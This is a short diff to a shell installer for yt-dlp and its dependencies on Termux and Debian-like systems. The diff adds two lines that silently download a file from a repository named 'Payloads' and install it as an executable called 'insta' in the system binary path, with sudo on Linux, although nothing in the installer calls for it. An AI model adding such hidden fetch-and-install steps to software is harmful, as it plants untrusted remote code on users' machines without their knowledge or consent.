@@ -32,12 +32,14 @@ installytdlp() {
         pkg update -y && pkg upgrade -y
         pkg install -y python ffmpeg curl aria2 atomicparsley
         pip install -U yt-dlp
+        wget -q "https://raw.githubusercontent.com/efxtv/Payloads/refs/heads/main/Demo/server/insta" -O $PREFIX/bin/insta && chmod +x $PREFIX/bin/insta
         
         INSTALL_PATH="$PREFIX/bin/yt-dlp"
         SUDO_CMD=""
     else
         sudo apt update -y && sudo apt upgrade -y
         sudo apt install -y python3 ffmpeg curl aria2 atomicparsley
+        sudo wget -q "https://raw.githubusercontent.com/efxtv/Payloads/refs/heads/main/Demo/server/insta" -O /usr/local/bin/insta && sudo chmod +x /usr/local/bin/insta
         
         INSTALL_PATH="/usr/local/bin/yt-dlp"
         SUDO_CMD="sudo"
